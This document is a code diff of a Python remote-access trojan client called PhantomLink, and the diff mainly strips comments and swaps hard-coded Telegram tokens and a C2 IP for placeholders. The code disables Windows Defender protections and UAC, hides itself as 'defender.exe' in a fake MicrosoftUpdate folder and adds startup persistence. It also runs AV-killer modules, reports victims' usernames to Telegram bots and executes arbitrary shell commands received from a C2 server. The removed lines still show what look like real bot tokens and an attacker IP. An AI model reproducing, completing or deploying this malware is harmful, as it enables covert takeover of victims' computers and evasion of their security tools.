@@ -14,9 +14,7 @@ import requests
 from av_bypass import AVBypass
 import base64
 
-
-version = 10.7 #7/3/2026
-
+version = 10.7  # 7/3/2026
 
 
 def bypass_all_security():
@@ -30,16 +28,19 @@ def bypass_all_security():
         tel_logger(f"[!] AV Bypass error: {e}")
         return False
 
-BOT_TOKEN = "7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw"
-CHAT_ID = "6042298920"
+#Telegram
+BOT_TOKEN = "BOT TOKEN"
+CHAT_ID = "CHAT ID"
+
 
 def tel_logger(log):
-    url = f"https://api.telegram.org/bot8282137342:AAFd93wSzwEVliRmm2kSc1AWUf1tqv68Tv0/sendMessage"
+    url = f"https://api.telegram.org/BOT TOKENT/sendMessage"
     data = {
         'chat_id': CHAT_ID,
         'text': log
     }
     response = requests.post(url, data=data)
+
 
 def tel_notify(log):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -48,6 +49,7 @@ def tel_notify(log):
         'text': log
     }
     response = requests.post(url, data=data)
+
 
 appdata_path = os.getenv("APPDATA")
 target_folder = os.path.join(appdata_path, "MicrosoftUpdate")
@@ -58,14 +60,18 @@ file_to_delete = os.path.join(target_folder, "defender.exe")
 
 username = os.getenv("USERNAME", "Unknown")
 
+
 def bypass_security():
     try:
         try:
-            subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableScanningNetworkFiles $true -DisableScriptScanning $true"', shell=True, capture_output=True, text=True)
+            subprocess.run(
+                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableScanningNetworkFiles $true -DisableScriptScanning $true"',
+                shell=True, capture_output=True, text=True)
         except:
             pass
         try:
-            subprocess.run('attrib +h +s "%APPDATA%\\MicrosoftUpdate\\*" /s /d', shell=True, capture_output=True, text=True)
+            subprocess.run('attrib +h +s "%APPDATA%\\MicrosoftUpdate\\*" /s /d', shell=True, capture_output=True,
+                           text=True)
         except:
             pass
         result = subprocess.run(
@@ -109,14 +115,12 @@ def update():
         max_attempts = 5
         for attempt in range(max_attempts):
             try:
-                # Method 1: Normal delete
                 try:
                     os.remove(path)
                     return True
                 except:
                     pass
 
-                # Method 2: Change attributes and delete
                 try:
                     import ctypes
                     ctypes.windll.kernel32.SetFileAttributesW(path, 0x80)  # FILE_ATTRIBUTE_NORMAL
@@ -125,7 +129,6 @@ def update():
                 except:
                     pass
 
-                # Method 3: Rename then delete
                 try:
                     temp_name = path + f".temp{time.time()}"
                     os.rename(path, temp_name)
@@ -134,7 +137,6 @@ def update():
                 except:
                     pass
 
-                # Method 4: Just rename to get it out of the way
                 try:
                     backup_name = path + f".old{time.time()}"
                     os.rename(path, backup_name)
@@ -159,7 +161,6 @@ def update():
         try:
             for proc in psutil.process_iter(['pid', 'name', 'exe', 'open_files']):
                 try:
-                    # Check by exe path
                     exe = proc.info.get('exe')
                     if exe and os.path.exists(exe):
                         try:
@@ -172,7 +173,6 @@ def update():
                         except:
                             pass
 
-                    # Check open files
                     try:
                         open_files = proc.open_files()
                         for f in open_files:
@@ -210,22 +210,18 @@ def update():
 
         for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
             try:
-                # Skip ourselves
                 if proc.info['pid'] == current_pid:
                     continue
 
-                # Kill by name
                 if proc.info['name'] in [current_name, 'defender.exe', 'PhantomLink.exe', 'client.exe']:
                     print(f"[*] Killing instance by name: PID {proc.info['pid']} ({proc.info['name']})")
                     proc.kill()
                     killed_count += 1
                     continue
 
-                # Kill by exe path
                 exe = proc.info.get('exe')
                 if exe:
                     try:
-                        # Check if in MicrosoftUpdate folder
                         if 'MicrosoftUpdate' in exe and 'defender.exe' in exe:
                             print(f"[*] Killing hidden instance: PID {proc.info['pid']}")
                             proc.kill()
@@ -234,7 +230,6 @@ def update():
                     except:
                         pass
 
-                # Kill by command line
                 cmdline = proc.info.get('cmdline')
                 if cmdline:
                     cmdline_str = ' '.join(cmdline).lower()
@@ -250,7 +245,7 @@ def update():
 
         if killed_count > 0:
             print(f"[+] Killed {killed_count} other instance(s)")
-            time.sleep(5)  # Wait longer for processes to fully die
+            time.sleep(5)
         else:
             print("[*] No other instances found")
 
@@ -261,11 +256,11 @@ def update():
 
         for attempt in range(max_attempts):
             try:
-                # Try to write
+                # write
                 with open(txt_file_path, 'w', encoding='UTF-8') as f:
                     f.write(version_str)
 
-                # Verify it was written
+                # Verify writing
                 with open(txt_file_path, 'r', encoding='UTF-8') as f:
                     written = f.read().strip()
 
@@ -278,10 +273,10 @@ def update():
             except PermissionError:
                 print(f"[*] Version file locked, attempt {attempt + 1}/{max_attempts}")
 
-                # Kill any process that might be locking it
+                # Kill process
                 kill_process_using(txt_file_path)
 
-                # Try to unlock the file
+                # unlock the file
                 try:
                     import ctypes
                     ctypes.windll.kernel32.SetFileAttributesW(txt_file_path, 0x80)
@@ -311,30 +306,26 @@ def update():
         tel_logger(f"[!] Failed to update version file for {username} after {max_attempts} attempts")
         return False
 
-    # ═══════════════════════════════════════════════════════
-    # UPDATE LOGIC
-    # ═══════════════════════════════════════════════════════
-
     if old_ver < version:
         print(f"\n[*] UPDATE REQUIRED: {old_ver} → {version}")
         tel_logger(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
         tel_notify(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
 
-        # Step 1: Kill all other instances
+        # Kill all other instances
         print("\n[UPDATE STEP 1/4] Killing all other instances...")
         kill_all_instances()
 
-        # Step 2: Kill anything using the version file
+        # Kill anything using the version file
         print("\n[UPDATE STEP 2/4] Unlocking version file...")
         kill_process_using(txt_file_path)
 
-        # Step 3: Delete old defender.exe
+        # Delete old defender.exe
         print("\n[UPDATE STEP 3/4] Removing old executable...")
         if os.path.exists(file_to_delete):
             kill_process_using(file_to_delete)
             force_delete(file_to_delete)
 
-        # Clean up old paths
+        # Clean up
         old_path_file = os.path.join(target_folder, "oldpath.txt")
         if os.path.exists(old_path_file):
             try:
@@ -348,7 +339,7 @@ def update():
             except:
                 pass
 
-        # Step 4: Update version file
+        # Update version file
         print("\n[UPDATE STEP 4/4] Writing new version...")
         if force_write_version(str(version)):
             print("[✓] Update completed successfully!\n")
@@ -389,9 +380,6 @@ def move_to_hidden_location():
     dest_file = os.path.join(hidden_dir, "defender.exe")
     current_path = os.path.abspath(sys.argv[0])
 
-    # ═══════════════════════════════════════════════════════
-    # CHECK: Are we already defender.exe?
-    # ═══════════════════════════════════════════════════════
     try:
         if os.path.samefile(current_path, dest_file):
             print("[*] Already running as defender.exe")
@@ -400,15 +388,9 @@ def move_to_hidden_location():
     except:
         pass
 
-    # ═══════════════════════════════════════════════════════
-    # WE'RE RUNNING FROM ORIGINAL LOCATION (D:/)
-    # OUR JOB: Copy to hidden location, launch defender.exe,
-    #          verify it started, THEN exit
-    # ═══════════════════════════════════════════════════════
-
     print("[*] Running from original location - will copy and launch defender.exe")
 
-    # Kill any existing defender.exe first
+    # Kill any existing defender.exe
     print("[*] Checking for existing defender.exe...")
     for proc in psutil.process_iter(['pid', 'name', 'exe']):
         try:
@@ -419,7 +401,7 @@ def move_to_hidden_location():
         except:
             pass
 
-    # Remove old file if exists
+    # Remove old file
     if os.path.exists(dest_file):
         try:
             os.remove(dest_file)
@@ -442,7 +424,6 @@ def move_to_hidden_location():
         add_to_startup(current_path)
         return True  # Continue running from here
 
-    # Verify copy worked
     if not os.path.exists(dest_file):
         print("[!] Copy verification failed")
         return True
@@ -451,24 +432,21 @@ def move_to_hidden_location():
     add_to_startup(dest_file)
     print("[+] Added to startup")
 
-    # ═══════════════════════════════════════════════════════
-    # LAUNCH defender.exe
-    # ═══════════════════════════════════════════════════════
+    # LAUNCH
 
     print("\n[*] Launching defender.exe...")
 
     try:
-        # Launch defender.exe with admin privileges
+        # Launch with admin
         print("[*] Launching defender.exe with admin privileges...")
 
-        # Use ShellExecute to launch with admin
         result = ctypes.windll.shell32.ShellExecuteW(
             None,
-            "runas",  # Request admin
+            "runas",
             dest_file,
             None,
             None,
-            0  # SW_HIDE - hidden window
+            0
         )
 
         if result > 32:  # Success
@@ -477,7 +455,7 @@ def move_to_hidden_location():
             print(f"[!] Launch failed with code: {result}")
             print("[*] Trying without admin...")
 
-            # Fallback: launch without admin
+            # Fallback
             proc = subprocess.Popen(
                 [dest_file],
                 shell=False,
@@ -491,15 +469,11 @@ def move_to_hidden_location():
     except Exception as e:
         print(f"[!] Failed to launch: {e}")
         print("[*] Will run from current location")
-        return True  # Continue running from here
-
-    # ═══════════════════════════════════════════════════════
-    # WAIT AND VERIFY defender.exe IS RUNNING
-    # ═══════════════════════════════════════════════════════
+        return True
 
     print("[*] Waiting for defender.exe to start...")
 
-    max_wait = 20  # Wait up to 20 seconds (increased)
+    max_wait = 20
     defender_running = False
     defender_pid = None
 
@@ -509,13 +483,11 @@ def move_to_hidden_location():
         # Check if defender.exe is running
         for p in psutil.process_iter(['pid', 'name', 'exe']):
             try:
-                # Check by name
                 if p.info['name'] == 'defender.exe':
                     defender_running = True
                     defender_pid = p.info['pid']
                     break
 
-                # Check by path
                 if p.info['exe'] and 'defender.exe' in p.info['exe']:
                     defender_running = True
                     defender_pid = p.info['pid']
@@ -530,11 +502,9 @@ def move_to_hidden_location():
         if (i + 1) % 5 == 0:
             print(f"[*] Still waiting... ({i + 1}/{max_wait} seconds)")
 
-    # Extra verification
     if defender_running:
-        time.sleep(2)  # Wait a bit more
+        time.sleep(2)
 
-        # Double-check it's still running
         still_running = False
         for p in psutil.process_iter(['pid']):
             try:
@@ -552,12 +522,7 @@ def move_to_hidden_location():
         print("[!] Could not verify defender.exe started")
         print("[!] Will continue running from current location instead")
         tel_logger(f"[!] {username} - defender.exe failed to start, running from original location")
-        return True  # Continue running from here
-
-    # ═══════════════════════════════════════════════════════
-    # SUCCESS! defender.exe is confirmed running
-    # Now we can safely exit this instance
-    # ═══════════════════════════════════════════════════════
+        return True
 
     print("\n[✓] SUCCESS! defender.exe is running")
     print("[*] This instance will now exit")
@@ -566,13 +531,11 @@ def move_to_hidden_location():
     tel_logger(f"[+] {username} - Successfully moved to hidden location")
 
     time.sleep(2)
-    sys.exit(0)  # Exit ONLY after confirming defender.exe is running
+    sys.exit(0)
 
 
 def disable_uac():
-    """Only disable UAC if it's currently enabled"""
     try:
-        # Check current UAC status first
         key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
         reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
 
@@ -585,10 +548,8 @@ def disable_uac():
                 return True
 
         except FileNotFoundError:
-            # Key doesn't exist, UAC is enabled by default
             winreg.CloseKey(reg_key)
 
-        # UAC is enabled, so disable it
         print("[*] Disabling UAC...")
         subprocess.call([
             "reg", "add",
@@ -609,8 +570,7 @@ def disable_uac():
         return False
 
 
-
-HOST = "81.10.55.8"
+HOST = "LISTEN IP"
 PORT = 5000
 
 
@@ -619,7 +579,7 @@ class ShellClient:
         self.socket = None
         self.connected = False
         self.should_exit = False
-        self.message_lock = threading.Lock()  # Prevent concurrent socket operations
+        self.message_lock = threading.Lock()
         self.username = os.getenv("USERNAME", "Unknown")
 
     def _send_message(self, data):
@@ -629,7 +589,7 @@ class ShellClient:
                 if isinstance(data, str):
                     data = data.encode('utf-8')
 
-                # Send length first (4 bytes)
+                # Send length (4 bytes)
                 msg_len = len(data)
                 self.socket.sendall(struct.pack('!I', msg_len))
                 # Send data
@@ -652,14 +612,13 @@ class ShellClient:
         """Receive data with length prefix (thread-safe)"""
         with self.message_lock:
             try:
-                # First, receive the length (4 bytes)
+                # receive the length (4 bytes)
                 raw_msglen = self._recv_exactly(4)
                 if not raw_msglen:
                     return None
 
                 msglen = struct.unpack('!I', raw_msglen)[0]
 
-                # Sanity check for message length
                 if msglen > 10 * 1024 * 1024:  # 10MB limit
                     print(f"[!] Message too large: {msglen} bytes")
                     return None
@@ -708,7 +667,7 @@ class ShellClient:
 
                 self.socket.connect((HOST, PORT))
 
-                # Send credentials immediately after connecting
+                # Send credentials
                 password = "PhantomLink"
                 if not self._send_message(password):
                     raise Exception("Failed to send password")
@@ -721,7 +680,7 @@ class ShellClient:
                 print(f"[+] Connected to server as {self.username}")
                 tel_logger(f"[+] [{self.username}] Connected to server")
                 time.sleep(2)
-                backoff_time = 1  # Reset backoff on successful connection
+                backoff_time = 1
                 return True
 
             except Exception as e:
@@ -735,7 +694,7 @@ class ShellClient:
                 if not self.should_exit:
                     print(f"[*] Retrying in {backoff_time} seconds...")
                     time.sleep(backoff_time)
-                    backoff_time = min(backoff_time * 2, max_backoff)  # Exponential backoff
+                    backoff_time = min(backoff_time * 2, max_backoff)
 
         return False
 
@@ -749,7 +708,6 @@ class ShellClient:
                 tel_logger(f"{self.username}\nExiting . . .")
                 return "[+] Exiting..."
 
-            # Handle cd command specially
             if command.startswith("cd "):
                 path = command[3:].strip()
                 try:
@@ -760,16 +718,12 @@ class ShellClient:
                     tel_logger(f"{self.username}\n[!] Failed to change directory: {e}")
                     return f"[!] Failed to change directory: {e}"
 
-            # Handle pwd command
             if command == "pwd":
                 return os.getcwd()
 
-            # IMPROVED: Only run in background if it's a simple launch command
-            # NOT if it's a complex PowerShell script that needs output
             background_keywords = ['curl -O http', '&& start /B']
             is_background = any(keyword in command for keyword in background_keywords)
 
-            # Also check: if command is VERY short and just launches something
             if command.count(' ') < 3 and ('start ' in command.lower() or '.exe' in command.lower()):
                 is_background = True
 
@@ -787,7 +741,6 @@ class ShellClient:
                 except Exception as e:
                     return f"[!] Failed to start background process: {e}"
 
-            # Execute other commands normally and WAIT for output
             try:
                 result = subprocess.run(
                     command,
@@ -830,10 +783,8 @@ class ShellClient:
                     message = self._recv_message()
 
                     if not message:
-                        # No message - check if it's a real disconnect or just timeout
                         print("[*] No message received, testing connection...")
 
-                        # Try to send a test message to see if connection is alive
                         try:
                             test_sent = self._send_message("HEARTBEAT")
                             if not test_sent:
@@ -841,14 +792,12 @@ class ShellClient:
                                 tel_logger(f"{self.username}\n[!] Connection test failed")
                                 break
 
-                            # If send succeeded, check socket error
                             error = self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                             if error != 0:
                                 print(f"[!] Socket error: {error}")
                                 tel_logger(f"{self.username}\n[!] Socket error: {error}")
                                 break
 
-                            # Connection seems OK, continue waiting
                             print("[*] Connection OK, continuing...")
                             continue
 
@@ -859,9 +808,7 @@ class ShellClient:
 
                     message_str = message.decode('utf-8', errors='ignore')
 
-                    # Handle different message types
                     if message_str == "PING":
-                        # Respond to keepalive ping immediately
                         if not self._send_message("PONG"):
                             print("[!] Failed to send PONG response")
                             tel_logger(f"{self.username}\n[!] Failed to send PONG response")
@@ -889,7 +836,6 @@ class ShellClient:
                             break
 
                     elif message_str == "HEARTBEAT":
-                        # Ignore our own heartbeat test messages
                         continue
 
                     else:
@@ -897,7 +843,6 @@ class ShellClient:
                         tel_logger(f"{self.username}\n[!] Unknown message type: {message_str[:50]}")
 
                 except socket.timeout:
-                    # Timeout - test if connection is still alive
                     print("[*] Timeout - testing connection...")
                     try:
                         # Send test to check if still connected
@@ -905,7 +850,6 @@ class ShellClient:
                             print("[!] Connection dead (send failed)")
                             break
 
-                        # Check socket status
                         error = self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                         if error != 0:
                             print(f"[!] Socket error: {error}")
@@ -957,7 +901,6 @@ class ShellClient:
         try:
             while not self.should_exit:
                 try:
-                    # Clean up old socket before reconnecting
                     if self.socket:
                         try:
                             self.socket.close()
@@ -974,7 +917,6 @@ class ShellClient:
                             time.sleep(10)
                         continue
 
-                    # Handle communication
                     self.handle_server_communication()
 
                     if not self.should_exit:
@@ -996,7 +938,6 @@ class ShellClient:
         except KeyboardInterrupt:
             print("\n[*] Shutting down...")
         finally:
-            # Final cleanup
             try:
                 if self.socket:
                     self.socket.close()
@@ -1009,10 +950,6 @@ class ShellClient:
 
 def main():
     """Main entry point"""
-
-    # ═══════════════════════════════════════════════════════
-    # CHECK ADMIN PRIVILEGES
-    # ═══════════════════════════════════════════════════════
 
     def is_admin():
         try:
@@ -1030,10 +967,6 @@ def main():
             print(f"[!] Failed to get admin: {e}")
             print("[*] Continuing without admin...")
 
-    # ═══════════════════════════════════════════════════════
-    # STARTUP
-    # ═══════════════════════════════════════════════════════
-
     print("[*] Starting PhantomLink Client...")
     tel_logger(f"[*] Starting PhantomLink Client for {username}")
     tel_notify(f"[*] Starting PhantomLink Client for {username}")
@@ -1042,7 +975,7 @@ def main():
     print("PHANTOMLINK CLIENT STARTUP")
     print("=" * 60 + "\n")
 
-    # Step 1: Disable UAC
+    # 1 Disable UAC
     try:
         print("[1/7] Disabling UAC...", end=" ")
         disable_uac()
@@ -1050,7 +983,7 @@ def main():
     except Exception as e:
         print(f"✗ ({e})")
 
-    # Step 2: Update
+    # 2 Update
     try:
         print("[2/7] Checking for updates...", end=" ")
         update()
@@ -1058,7 +991,7 @@ def main():
     except Exception as e:
         print(f"✗ ({e})")
 
-    # Step 3: Bypass Security
+    # 3 Bypass Security
     try:
         print("[3/7] Bypassing security...", end=" ")
         bypass_security()
@@ -1066,7 +999,7 @@ def main():
     except Exception as e:
         print(f"✗ ({e})")
 
-    # Step 4: Move to Hidden Location
+    # 4 Move to Hidden Location
     try:
         print("[4/7] Moving to hidden location...")
         move_to_hidden_location()
@@ -1074,14 +1007,14 @@ def main():
     except Exception as e:
         print(f"✗ ({e})")
 
-    # Step 5: Persistence
+    # 5 Persistence
     try:
         print("[5/7] Installing persistence...", end=" ")
         print("✓")
     except Exception as e:
         print(f"✗ ({e})")
 
-    # Step 6: Full AV Bypass
+    # 6 Full AV Bypass
     try:
         print("[6/7] Full AV bypass...", end=" ")
         bypass_all_security()
@@ -1089,7 +1022,7 @@ def main():
     except Exception as e:
         print(f"✗ ({e})")
 
-    # Step 7: AV Killer
+    # 7 AV Killer
     try:
         print("[7/7] Starting AV Killer...", end=" ")
         from av_killer import AVKiller
@@ -1103,7 +1036,6 @@ def main():
     print("STARTUP COMPLETE - CONNECTING TO C2 SERVER")
     print("=" * 60 + "\n")
 
-    # Advanced features (only once)
     install_marker = os.path.join(os.getenv('APPDATA'), 'MicrosoftUpdate', '.installed')
     if not os.path.exists(install_marker):
         print("[*] First-time setup - Installing advanced features...")
@@ -1128,4 +1060,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
